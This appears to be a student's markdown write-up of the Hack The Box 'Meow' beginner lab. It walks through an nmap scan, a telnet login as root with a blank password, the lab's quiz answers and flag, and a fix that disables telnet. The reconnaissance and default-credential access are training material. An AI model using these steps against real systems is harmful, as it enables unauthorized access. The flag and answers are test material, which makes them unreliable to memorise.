---
id: starting_point_meow
aliases: []
tags:
  - telnet
  - protocols
  - reconnaisance
  - weak_credentials
  - misconfiguration
date: "2025-01-19"
---

# HTB_starting_point_meow

- Platform: Hack The Box
- Category: Privilege Escalation
- Difficulty: Very Easy
- Estimated Time: Under 10 minutes

---

## 💡 **Objective**

- What does the acronym VM stand for?
  `Virtual Machine`
- What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
  `Terminal`
- What service do we use to form our VPN connection into HTB labs?
  `openvpn`
- What tool do we use to test our connection to the target with an ICMP echo request?
  `ping`
- What is the name of the most common tool for finding open ports on a target?
  `nmap`
- What service do we identify on port 23/tcp during our scans?
  `telnet`
- What username is able to log into the target over telnet with a blank password?
  `root`
- Submit root flag
  ```bash
  root@Meow:~# ls
  flag.txt  snap
  root@Meow:~# cat flag.txt
  b40abdfe23665f766f9c61ecba8a4c19
  ```

---

## 🛠️ **Preparation**

- **Tools Used:** [Nmap]
- **Environment:** [Kali Linux]
- **Commands to Remember:**
  ```bash
  nmap nmap -T4 -F -sS -oN starting_point_meow2.txt 10.129.14.116
  ```

---

## 🔍 **Enumeration**

- **Initial Reconnaissance:**
  - Target IP/URL: `10.129.14.116`
  - Open Ports/Services:
    ```plaintext
    23/tcp open  telnet
    ```
  - Vulnerabilities Identified:
    - [CVE-1999-0619]
    - [CVE-2011-4862]
- **Detailed Findings:**
  - Login without authentication credentials

---

## 🧩 **Exploitation**

- **Steps Taken:**

  1. Scanning IP with nmap

  ```bash
  -$ nmap -T4 -F -sS -oN starting_point_meow2.txt 10.129.14.116
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 03:28 EST
  Failed to resolve "nmap".
  Nmap scan report for 10.129.14.116
  Host is up (0.27s latency).
  Not shown: 99 closed tcp ports (reset)
  PORT   STATE SERVICE
  23/tcp open  telnet

  Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds

  ```

  2. Identifying open ports: Telnet
  3. Connect with telnet, using default credentials. Username: root

  ```bash
  -$ telnet 10.129.14.116 23
  Trying 10.129.14.116...
  Connected to 10.129.14.116.
  Escape character is '^]'.

    █  █         ▐▌     ▄█▄ █          ▄▄▄▄
    █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
    █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


  Meow login: root
  Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage

    System information as of Mon 20 Jan 2025 09:18:56 AM UTC

    System load:           0.08
    Usage of /:            41.7% of 7.75GB
    Memory usage:          4%
    Swap usage:            0%
    Processes:             135
    Users logged in:       0
    IPv4 address for eth0: 10.129.14.116
    IPv6 address for eth0: dead:beef::250:56ff:feb0:4d34

   * Super-optimized for small spaces - read how we shrank the memory
     footprint of MicroK8s to make it the smallest full K8s around.

     https://ubuntu.com/blog/microk8s-memory-optimisation

  75 updates can be applied immediately.
  31 of these updates are standard security updates.
  To see these additional updates run: apt list --upgradable


  The list of available updates is more than a week old.
  To check for new updates run: sudo apt update

  Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
  root@Meow:~#
  ```

- **Challenges Faced:**
  - Guessing the username

---

## 🚀 **Post-Exploitation**

- **Access Gained:**
  - User: [root]
  - Privileges: [unlimited]
- **Privilege Escalation Steps:**
  - No Escalation, Already Higher Privileges

---

## 📝 **Key Learnings**

- **What I Learned:**
  - Connecting to the target with telnet, using default credentials.
  - Scanning IP using new options in nmap
    ```bash
    -$ nmap -T4 -F -sS -oN starting_point_meow2.txt 10.129.14.116
    ```
- **Mistakes to Avoid:**
  - Using the wrong port
  - Using the wrong username

---

## 🔧 **How To Fix Vulnerabilities**

- **Vulnearbilties Encountered:**
  - Vuln: Telnet service is activated using default credentials
  - Fix: Close the port 23, unactive the Telnet service
- ## **Helpful Resources:**
  - [Telnet](https://www.exabytes.co.id/blog/apa-itu-telnet-adalah/)

---

## 🎯 **Post-Lab Reflection**

- **How Could I Improve?**
  - Improve the nmap scan
    ```bash
    -$ nmap -T4 -F -sS -oN starting_point_meow2.txt 10.129.14.116
    ```
- **Next Steps:**
  - Learn how to activate or deactivate telnet services
